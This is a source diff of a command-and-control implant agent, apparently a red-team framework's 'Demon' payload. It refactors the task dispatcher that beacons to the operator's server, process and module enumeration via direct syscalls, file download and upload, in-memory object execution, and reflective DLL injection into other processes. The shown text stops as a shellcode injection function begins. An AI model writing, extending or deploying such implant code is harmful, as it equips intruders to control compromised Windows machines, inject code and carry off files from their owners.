@@ -34,7 +34,7 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_TOKEN,                    .Function = CommandToken                    },
         { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
         { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
-        { .ID = DEMON_COMMAND_KERBEROS,                 .Function = Commandkerberos                 },
+        { .ID = DEMON_COMMAND_KERBEROS,                 .Function = CommandKerberos                 },
         { .ID = DEMON_COMMAND_MEM_FILE,                 .Function = CommandMemFile                  },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
 
@@ -44,7 +44,6 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
 
 VOID CommandDispatcher( VOID )
 {
-    PPACKAGE Package;
     PARSER   Parser         = { 0 };
     LPVOID   DataBuffer     = NULL;
     SIZE_T   DataBufferSize = 0;
@@ -56,13 +55,6 @@ VOID CommandDispatcher( VOID )
 
     PRINTF( "Session ID => %x\n", Instance.Session.AgentID );
 
-    /* Create our request task package */
-    Package = PackageCreate( DEMON_COMMAND_GET_JOB );
-
-    /* We don't want it to get destroyed. we kinda want to avoid alloc memory for it everytime. */
-    Package->Destroy = FALSE;
-    PackageAddInt32( Package, Instance.Session.AgentID );
-
     do
     {
         if ( ! Instance.Session.Connected )
@@ -72,7 +64,6 @@ VOID CommandDispatcher( VOID )
 
         if ( ReachedKillDate() )
         {
-            PackageDestroy( Package );
             KillDate();
         }
 
@@ -84,15 +75,17 @@ VOID CommandDispatcher( VOID )
 
 #ifdef TRANSPORT_HTTP
         /* Send our buffer. */
-        if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
+        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
         {
-            PackageDestroy( Package );
             CommandExit( NULL );
         }
 
 /* SMB */
 #else
-        // SMB agents simply try to read from their Pipe
+        // send all the packages we might have
+        PackageTransmitAll( NULL, NULL );
+
+        // read from pipe to receive new tasks
         if ( ! SMBGetJob( &DataBuffer, &DataBufferSize ) )
         {
             PUTS( "SMBGetJob failed" )
@@ -105,8 +98,8 @@ VOID CommandDispatcher( VOID )
             ParserNew( &Parser, DataBuffer, DataBufferSize );
             do
             {
-                RequestID  = ParserGetInt32( &Parser );
                 CommandID  = ParserGetInt32( &Parser );
+                RequestID  = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
                 Instance.CurrentRequestID = RequestID;
@@ -170,8 +163,6 @@ VOID CommandDispatcher( VOID )
 
     Instance.Session.Connected = FALSE;
 
-    PackageDestroy( Package );
-
     PUTS( "Out of while loop" )
 }
 
@@ -183,7 +174,7 @@ VOID CommandCheckin( PPARSER Parser )
 
     DemonMetaData( &Package, FALSE );
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandSleep( PPARSER Parser )
@@ -197,7 +188,7 @@ VOID CommandSleep( PPARSER Parser )
 
     PackageAddInt32( Package, Instance.Config.Sleeping );
     PackageAddInt32( Package, Instance.Config.Jitter );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandJob( PPARSER Parser )
@@ -272,7 +263,7 @@ VOID CommandJob( PPARSER Parser )
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandProc( PPARSER Parser )
@@ -284,23 +275,23 @@ VOID CommandProc( PPARSER Parser )
 
     switch ( SubCommand )
     {
-        case DEMON_COMMAND_PROC_MODULES: PUTS("Proc::Modules")
+        case DEMON_COMMAND_PROC_MODULES: PUTS( "Proc::Modules" )
         {
             PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
             UINT32                    ProcessID        = 0;
-            HANDLE                    hProcess         = NULL;
-            HANDLE                    hToken           = NULL;
+            HANDLE                    hProcess         = NtCurrentProcess();
             NTSTATUS                  NtStatus         = STATUS_SUCCESS;
 
-            if ( Parser->Length > 0 )
+            if ( Parser->Length > 0 ) {
                 ProcessID = ParserGetInt32( Parser );
-            else
-                ProcessID = Instance.Session.PID;
+                hProcess  = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
+                if ( hProcess ) {
+                    PACKAGE_ERROR_WIN32
+                    break;
+                }
+            }
 
-            hProcess = ProcessOpen( ProcessID, PROCESS_ALL_ACCESS );
-            Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken );
-
-            NtStatus = Instance.Syscall.NtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
+            NtStatus = SysNtQueryInformationProcess( hProcess, ProcessBasicInformation, &ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), 0 );
             if ( NT_SUCCESS( NtStatus ) )
             {
                 PPEB_LDR_DATA           LoaderData              = NULL;
@@ -312,21 +303,20 @@ VOID CommandProc( PPARSER Parser )
 
                 PackageAddInt32( Package, ProcessID );
 
-                if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
+                if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->Ldr, &LoaderData, sizeof( PPEB_LDR_DATA ), &Size ) ) )
                 {
                     ListHead = & LoaderData->InMemoryOrderModuleList;
 
                     Size = 0;
-                    if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
+                    if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, &LoaderData->InMemoryOrderModuleList.Flink, &ListEntry, sizeof( PLIST_ENTRY ), NULL ) ) )
                     {
                         while ( ListEntry != ListHead )
                         {
-                            if ( NT_SUCCESS( Instance.Syscall.NtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
+                            if ( NT_SUCCESS( SysNtReadVirtualMemory( hProcess, CONTAINING_RECORD( ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks ), &CurrentModule, sizeof( CurrentModule ), NULL ) ) )
                             {
-                                Instance.Syscall.NtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );
+                                SysNtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );
 
-                                if ( CurrentModule.FullDllName.Length > 0 )
-                                {
+                                if ( CurrentModule.FullDllName.Length > 0 ) {
                                     Size = WCharStringToCharString( ModuleName, ModuleNameW, CurrentModule.FullDllName.Length );
 
                                     PackageAddString( Package, ModuleName );
@@ -343,11 +333,9 @@ VOID CommandProc( PPARSER Parser )
                 }
             }
 
-            if ( hProcess )
-                Instance.Win32.NtClose( hProcess );
-
-            if ( hToken )
-                Instance.Win32.NtClose( hToken );
+            if ( hProcess ) {
+                SysNtClose( hProcess );
+            }
 
             break;
         }
@@ -363,8 +351,7 @@ VOID CommandProc( PPARSER Parser )
 
             /* Process Name and Process User token */
             CHAR    ProcName[ MAX_PATH ] = { 0 };
-            PCHAR   ProcUserName         = NULL;
-            UINT32  ProcUserSize         = 0;
+            BUFFER  UserDomain           = { 0 };
 
             ProcessName = ParserGetString( Parser, &ProcessSize );
 
@@ -385,29 +372,37 @@ VOID CommandProc( PPARSER Parser )
                         HANDLE hProcess = NULL;
                         HANDLE hToken   = NULL;
 
-                        hProcess = ProcessOpen( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
+                        hProcess = ProcessOpen( U_PTR( SysProcessInfo->UniqueProcessId ) , ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
                         if ( ! hProcess )
                             continue;
 
-                        if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
-                            ProcUserName = TokenGetUserDomain( hToken, &ProcUserSize );
+                        if ( NT_SUCCESS( SysNtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) ) {
+                            if ( TokenQueryOwner( hToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
+                                /* well successful called the token user/domain query. continue */
+                            }
+                        }
 
                         PackageAddString( Package, ProcName );
                         PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId  );
                         PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
-                        PackageAddString( Package, ProcUserName );
+                        PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
                         PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );
 
-                        Instance.Win32.NtClose( hProcess );
-                        hProcess = NULL;
+                        if ( hProcess ) {
+                            SysNtClose( hProcess );
+                            hProcess = NULL;
+                        }
 
-                        if ( hToken )
-                            Instance.Win32.NtClose( hToken );
-                        hToken = NULL;
+                        if ( hToken ) {
+                            SysNtClose( hToken );
+                            hToken = NULL;
+                        }
 
-                        MemSet( ProcUserName, 0, ProcUserSize );
-                        if ( ProcUserName )
-                            Instance.Win32.LocalFree( ProcUserName );
+                        if ( UserDomain.Buffer ) {
+                            MemZero( UserDomain.Buffer, UserDomain.Length );
+                            NtHeapFree( UserDomain.Buffer );
+                            UserDomain.Buffer = NULL;
+                        }
                     }
 
                     if ( SysProcessInfo->NextEntryOffset == 0 )
@@ -468,9 +463,9 @@ VOID CommandProc( PPARSER Parser )
 
             if ( Success )
             {
-                Instance.Win32.NtClose( ProcessInfo.hThread );
+                SysNtClose( ProcessInfo.hThread );
                 if ( ! ProcessPiped )
-                    Instance.Win32.NtClose( ProcessInfo.hProcess );
+                    SysNtClose( ProcessInfo.hProcess );
 
                 PRINTF( "Successful spawned process: %d\n", ProcessInfo.dwProcessId );
             }
@@ -493,7 +488,7 @@ VOID CommandProc( PPARSER Parser )
                 PackageAddInt32( Package, ProcessID );
                 PackageAddInt32( Package, QueryProtec );
 
-                while ( NT_SUCCESS( Instance.Syscall.NtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
+                while ( NT_SUCCESS( SysNtQueryVirtualMemory( hProcess, Offset, MemoryBasicInformation, &MemInfo, sizeof( MemInfo ), &Result ) ) )
                 {
                     Offset = C_PTR( U_PTR( MemInfo.BaseAddress ) + MemInfo.RegionSize );
 
@@ -530,9 +525,8 @@ VOID CommandProc( PPARSER Parser )
                 Offset = NULL;
             }
 
-            if ( hProcess )
-            {
-                Instance.Win32.NtClose( hProcess );
+            if ( hProcess ) {
+                SysNtClose( hProcess );
                 hProcess = NULL;
             }
 
@@ -553,7 +547,7 @@ VOID CommandProc( PPARSER Parser )
 
             if ( hProcess )
             {
-                Instance.Win32.NtClose( hProcess );
+                SysNtClose( hProcess );
                 hProcess = NULL;
             }
 
@@ -562,102 +556,124 @@ VOID CommandProc( PPARSER Parser )
     }
 
     // TODO: handle error
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
+/*!
+ * get current list of running processes
+ * and sends it back to the server.
+ *
+ * TODO: refactor this.
+ *
+ * @param Parser
+ */
+VOID CommandProcList(
+    IN PPARSER Parser
+) {
+    PSYS_PROC_INFO SysProcessInfo  = { 0 };
+    PSYS_PROC_INFO SysProcessPtr   = { 0 }; /* is going to hold the original pointer of SysProcessInfo */
+    SIZE_T         ProcessInfoSize = { 0 };
+    PPACKAGE       Package         = { 0 };
+    DWORD          ProcessUI       = { 0 };
+    HANDLE         Token           = { 0 };
+    HANDLE         Process         = { 0 };
+    BUFFER         UserDomain      = { 0 };
+    BOOL           x86             = FALSE;
+    NTSTATUS       NtStatus        = STATUS_SUCCESS;
 
-VOID CommandProcList( PPARSER Parser )
-{
-    PSYSTEM_PROCESS_INFORMATION SysProcessInfo  = NULL;
-    PSYSTEM_PROCESS_INFORMATION PtrProcessInfo  = NULL; /* is going to hold the original pointer of SysProcessInfo */
-    SIZE_T                      ProcessInfoSize = 0;
-    PPACKAGE                    Package         = NULL;
-    NTSTATUS                    NtStatus        = STATUS_SUCCESS;
-    DWORD                       ProcessUI       = 0;
-
+    /* try to take a snapshot of current running processes */
     if ( NT_SUCCESS( NtStatus = ProcessSnapShot( &SysProcessInfo, &ProcessInfoSize ) ) )
     {
-        PRINTF( "SysProcessInfo: %p\n", SysProcessInfo );
+        PRINTF( "SysProcessInfo: %p : %d\n", SysProcessInfo, ProcessInfoSize );
 
         /* save the original pointer to free */
-        PtrProcessInfo = SysProcessInfo;
+        SysProcessPtr = SysProcessInfo;
 
         /* Create our package */
         Package   = PackageCreate( DEMON_COMMAND_PROC_LIST );
-        ProcessUI = ParserGetInt32( Parser );
+        ProcessUI = ParserGetInt32( Parser ); /* TODO: change from bool to process list id (what client requested it) */
 
         /* did we get this request from the Client Process Explorer or Console ? */
         PackageAddInt32( Package, ProcessUI );
 
-        while ( TRUE )
-        {
-            PCHAR  ProcessUser = NULL;
-            HANDLE hToken      = NULL;
-            UINT32 UserSize    = 0;
-            HANDLE hProcess    = NULL;
+        do {
+            /* open handle to each process with query information privilege since we don't need anything else besides basic info */
+            Process = ProcessOpen(
+                U_PTR( SysProcessInfo->UniqueProcessId ),
+                Instance.Session.OSVersion > WIN_VERSION_XP ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION
+            );
 
-            /* open handle to each process with query information privilege since we dont need anything else besides basic info */
-            hProcess = ProcessOpen( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId, ( Instance.Session.OSVersion > WIN_VERSION_XP ) ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );
-            if ( ! hProcess )
-                continue;
+            /* query data based on the process handle */
+            if ( Process )
+            {
+                /* open a process token handle */
+                if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( Process, TOKEN_QUERY, &Token ) ) ) {
+                    /* query the username and domain */
+                    if ( ! TokenQueryOwner( Token, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
+                        PUTS( "Failed to get Username and Domain\n" );
+                    } else {
+                        PRINTF( "UserDomain: %ls\n", UserDomain.Buffer )
+                    }
+                } else {
+                    PRINTF( "NtOpenProcessToken Failed => %lx\n", NtStatus )
+                }
 
-            /* Retrieve process token user */
-            if ( NT_SUCCESS( Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY, &hToken ) ) )
-                ProcessUser = TokenGetUserDomain( hToken, &UserSize );
+                /* check if the process handle is wow64 */
+                x86 = ProcessIsWow( Process );
+            }
 
             /* Now we append the collected process data to the process list  */
-            PackageAddWString( Package, SysProcessInfo->ImageName.Buffer );
-            PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId );
-            PackageAddInt32( Package, ProcessIsWow( hProcess ) );
-            PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
+            PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
+            PackageAddInt32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
+            PackageAddInt32( Package, x86 );
+            PackageAddInt32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
             PackageAddInt32( Package, SysProcessInfo->SessionId );
             PackageAddInt32( Package, SysProcessInfo->NumberOfThreads );
-            PackageAddString( Package, ProcessUser );
+            PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
 
-            /* Now lets cleanup */
 #ifdef DEBUG
             /* ignore this. is just for the debug prints.
              * if we close the handle to our own process we won't see any debug prints anymore */
-            if ( ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId != Instance.Session.PID )
-                Instance.Win32.NtClose( hProcess );
+            if ( U_PTR( SysProcessInfo->UniqueProcessId ) != Instance.Session.PID ) {
+                SysNtClose( Process );
+            }
 #else
-            if ( hProcess )
-                Instance.Win32.NtClose( hProcess );
+            if ( Process ) {
+                SysNtClose( Process );
+            }
 #endif
 
-            if ( hToken )
-                Instance.Win32.NtClose( hToken );
+            if ( Token ) {
+                SysNtClose( Token );
+            }
 
-            if ( ProcessUser )
-            {
-                MemSet( ProcessUser, 0, UserSize );
-                Instance.Win32.LocalFree( ProcessUser );
-                ProcessUser = NULL;
+            if ( UserDomain.Buffer ) {
+                MemZero( UserDomain.Buffer, UserDomain.Length );
+                NtHeapFree( UserDomain.Buffer );
+                UserDomain.Buffer = NULL;
+                UserDomain.Length = 0;
             }
 
             /* there are no processes left. */
-            if ( ! SysProcessInfo->NextEntryOffset )
+            if ( ! SysProcessInfo->NextEntryOffset ) {
                 break;
+            }
 
             /* now go to the next process */
             SysProcessInfo = C_PTR( U_PTR( SysProcessInfo ) + SysProcessInfo->NextEntryOffset );
-        }
+        } while ( TRUE );
 
-        PackageTransmit( Package, NULL, NULL );
+        PackageTransmit( Package );
 
         /* Free our process list */
-        if ( PtrProcessInfo )
-        {
-            MemSet( PtrProcessInfo, 0, ProcessInfoSize );
-            NtHeapFree( PtrProcessInfo );
-            PtrProcessInfo = NULL;
+        if ( SysProcessPtr ) {
+            MemZero( SysProcessPtr, ProcessInfoSize );
+            NtHeapFree( SysProcessPtr );
+            SysProcessPtr  = NULL;
             SysProcessInfo = NULL;
         }
-    }
-    else
-    {
-        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-        CALLBACK_ERROR_WIN32;
+    } else {
+        PACKAGE_ERROR_NTSTATUS( NtStatus )
     }
 }
 
@@ -715,7 +731,7 @@ VOID CommandFS( PPARSER Parser )
                 Instance.Win32.FindClose( hFile );
 
                 PUTS( "LEAVE" )
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             do
@@ -757,12 +773,12 @@ VOID CommandFS( PPARSER Parser )
         {
             PDOWNLOAD_DATA Download = NULL;
             BUFFER         FileName = { 0 };
-            DWORD          FileSize = 0;
             PVOID          Buffer   = NULL;
             HANDLE         hFile    = NULL;
             BOOL           Success  = TRUE;
             WCHAR          FilePath[ MAX_PATH * 2 ] = { 0 };
             WCHAR          PathSize = MAX_PATH * 2;
+            LARGE_INTEGER  FileSize = { 0 };
 
             Buffer = ParserGetBytes( Parser, &FileName.Length );
 
@@ -776,7 +792,7 @@ VOID CommandFS( PPARSER Parser )
             {
                 PUTS( "CreateFileW: Failed" )
 
-                CALLBACK_GETLASTERROR
+                PACKAGE_ERROR_WIN32
 
                 Success = FALSE;
                 goto CleanupDownload;
@@ -785,15 +801,18 @@ VOID CommandFS( PPARSER Parser )
             PathSize = Instance.Win32.GetFullPathNameW( FileName.Buffer, PathSize, FilePath, NULL );
             PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )
 
-            FileSize = Instance.Win32.GetFileSize( hFile, 0 );
+            if ( ! Instance.Win32.GetFileSizeEx( hFile, &FileSize ) )
+            {
+                PUTS( "GetFileSizeEx: Failed" )
+
+                PACKAGE_ERROR_WIN32
+
+                Success = FALSE;
+                goto CleanupDownload;
+            }
 
             /* Start our download. */
-            if ( PathSize > 0 )
-                Download = DownloadAdd( hFile, FileSize );
-            else
-                Download = DownloadAdd( hFile, FileSize );
-
-            Download->RequestID = Instance.CurrentRequestID;
+            Download = DownloadAdd( hFile, FileSize.QuadPart );
 
             /*
 			 * Download Header:
@@ -816,7 +835,7 @@ VOID CommandFS( PPARSER Parser )
             PackageAddInt32( Package, Download->FileID   );
 
             /* Download Open Data */
-            PackageAddInt32( Package, FileSize ); /* TODO: change this to 64bit or else we can't download files larger than 4gb */
+            PackageAddInt64( Package, FileSize.QuadPart );
             if ( PathSize > 0 )
                 PackageAddWString( Package, FilePath );
             else
@@ -833,7 +852,7 @@ VOID CommandFS( PPARSER Parser )
             }
 
             if ( ! Success )
-                goto LEAVE;
+                goto CLEAR_LEAVE;
 
             break;
         }
@@ -876,7 +895,7 @@ VOID CommandFS( PPARSER Parser )
             if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
             {
                 PUTS( "CreateFileW: Failed" )
-                CALLBACK_GETLASTERROR
+                PACKAGE_ERROR_WIN32
                 Success = FALSE;
                 goto CleanupUpload;
             }
@@ -884,7 +903,7 @@ VOID CommandFS( PPARSER Parser )
             if ( ! Instance.Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
             {
                 PUTS( "WriteFile: Failed" )
-                CALLBACK_GETLASTERROR
+                PACKAGE_ERROR_WIN32
                 Success = FALSE;
                 goto CleanupUpload;
             }
@@ -893,14 +912,14 @@ VOID CommandFS( PPARSER Parser )
             PackageAddWString( Package, FileName );
 
         CleanupUpload:
-            if ( hFile )
-            {
-                Instance.Win32.NtClose( hFile );
+            if ( hFile ) {
+                SysNtClose( hFile );
                 hFile = NULL;
             }
 
-            if ( ! Success )
-                goto LEAVE;
+            if ( ! Success ) {
+                goto CLEAR_LEAVE;
+            }
 
             break;
         }
@@ -910,13 +929,10 @@ VOID CommandFS( PPARSER Parser )
             UINT32 PathSize = 0;
             LPWSTR Path     = ParserGetWString( Parser, &PathSize );
 
-            if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) )
-            {
+            if ( ! Instance.Win32.SetCurrentDirectoryW( Path ) ) {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                goto LEAVE;
-            }
-            else
-            {
+                goto CLEAR_LEAVE;
+            } else {
                 PackageAddWString( Package, Path );
             }
 
@@ -931,28 +947,23 @@ VOID CommandFS( PPARSER Parser )
 
             if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
             {
-                if ( ! Instance.Win32.RemoveDirectoryW( Path ) )
-                {
+                if ( ! Instance.Win32.RemoveDirectoryW( Path ) ) {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                    goto LEAVE;
-                }
-                else
-                {
+                    goto CLEAR_LEAVE;
+                } else {
                     PackageAddInt32( Package, TRUE );
                 }
             }
             else
             {
-                if ( ! Instance.Win32.DeleteFileW( Path ) )
-                {
+                if ( ! Instance.Win32.DeleteFileW( Path ) ) {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                    goto LEAVE;
-                }
-                else
-                {
+                    goto CLEAR_LEAVE;
+                } else {
                     PackageAddInt32( Package, FALSE );
                 }
             }
+
             PackageAddWString( Package, Path );
 
             break;
@@ -966,7 +977,7 @@ VOID CommandFS( PPARSER Parser )
             if ( ! Instance.Win32.CreateDirectoryW( Path, NULL ) )
             {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                goto LEAVE;
+                goto CLEAR_LEAVE;
             }
 
             PackageAddWString( Package, Path );
@@ -988,8 +999,10 @@ VOID CommandFS( PPARSER Parser )
             PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )
 
             Success = Instance.Win32.CopyFileW( PathFrom, PathTo, FALSE );
-            if ( ! Success )
-                CALLBACK_GETLASTERROR
+            if ( ! Success ) {
+                PACKAGE_ERROR_WIN32
+                goto CLEAR_LEAVE;
+            }
 
             PackageAddInt32( Package, Success );
             PackageAddWString( Package, PathFrom );
@@ -1003,13 +1016,12 @@ VOID CommandFS( PPARSER Parser )
             WCHAR Path[ MAX_PATH * 2 ] = { 0 };
             DWORD Return               = 0;
 
-            if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) )
-            {
+            if ( ! ( Return = Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) ) {
                 PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-            }
-            else
+                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() ); 
+            } else {
                 PackageAddWString( Package, Path );
+            }
 
             break;
         }
@@ -1046,12 +1058,11 @@ VOID CommandFS( PPARSER Parser )
         }
     }
 
-    PUTS( "Transmit package" )
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
+    return;
 
-LEAVE:
-    PUTS( "PackageDestroy" )
-    PackageDestroy( Package );
+CLEAR_LEAVE:
+    PackageDestroy( Package ); Package = NULL;
 }
 
 VOID CommandInlineExecute( PPARSER Parser )
@@ -1061,6 +1072,7 @@ VOID CommandInlineExecute( PPARSER Parser )
     UINT32    ArgSize          = 0;
     PCHAR     ObjectData       = NULL;
     PMEM_FILE MemFile          = NULL;
+    UINT32    RequestID        = Instance.CurrentRequestID;
     PCHAR     FunctionName     = ParserGetString( Parser, &FunctionNameSize );
     ULONG     MemFileID        = ParserGetInt32( Parser );
     PCHAR     ArgBuffer        = ParserGetString( Parser, &ArgSize );
@@ -1086,14 +1098,14 @@ VOID CommandInlineExecute( PPARSER Parser )
         case 0:
         {
             PUTS( "Use Non-Threaded CoffeeLdr" )
-            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
             break;
         }
 
         case 1:
         {
             PUTS( "Use Threaded CoffeeRunner" )
-            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             break;
         }
 
@@ -1104,12 +1116,12 @@ VOID CommandInlineExecute( PPARSER Parser )
             if ( Instance.Config.Implant.CoffeeThreaded )
             {
                 PUTS( "Config is set to threaded" )
-                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             }
             else
             {
                 PUTS( "Config is set to non-threaded" )
-                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
             }
 
             break;
@@ -1125,12 +1137,11 @@ VOID CommandInjectDLL( PPARSER Parser )
 
     UINT32            DllSize    = 0;
     DWORD             Result     = 1;
-    NTSTATUS          NtStatus   = STATUS_SUCCESS;
+    NTSTATUS          NtStatus   = STATUS_UNSUCCESSFUL;
     PBYTE             DllBytes   = NULL;
     UINT32            DllLdrSize = 0;
     PBYTE             DllLdr     = NULL;
     HANDLE            hProcess   = NULL;
-    CLIENT_ID         ProcID     = { 0 };
     OBJECT_ATTRIBUTES ObjAttr    = { sizeof( ObjAttr ) };
     INJECTION_CTX     InjCtx     = { 0 };
 
@@ -1140,27 +1151,28 @@ VOID CommandInjectDLL( PPARSER Parser )
     DllBytes         = ParserGetBytes( Parser, &DllSize );
     InjCtx.Parameter = ParserGetBytes( Parser, &InjCtx.ParameterSize );
 
+    PUTS( "CommandInjectDLL" )
     PRINTF( "Technique: %d\n", InjCtx.Technique )
     PRINTF( "ProcessID: %d\n", InjCtx.ProcessID )
     PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
     PRINTF( "Parameter: %x [%d]\n", InjCtx.Parameter, InjCtx.ParameterSize );
 
-    ProcID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) InjCtx.ProcessID;
+    hProcess = ProcessOpen( InjCtx.ProcessID, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION );
 
-    if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID ) ) )
+    if ( hProcess )
     {
         Result = DllInjectReflective( hProcess, DllLdr, DllLdrSize, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
+        SysNtClose( hProcess );
     }
     else
     {
-        PUTS( "[-] NtOpenProcess: Failed to open process" )
-        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
     }
 
     PRINTF( "Injected Result: %d\n", Result )
 
     PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandSpawnDLL( PPARSER Parser )
@@ -1179,70 +1191,114 @@ VOID CommandSpawnDLL( PPARSER Parser )
     Result  = DllSpawnReflective( DllLdr, DllLdrSize, DllBytes, DllSize, Arguments, ArgSize, &InjCtx );
 
     PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
-VOID CommandInjectShellcode( PPARSER Parser )
-{
-    PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
-    UINT32        ShellcodeSize  = 0;
-    UINT32        ArgumentSize   = 0;
+VOID CommandInjectShellcode(
+    IN PPARSER Parser
+) {
+    PPACKAGE  Package = NULL;
+    DWORD     Status  = INJECT_ERROR_FAILED;
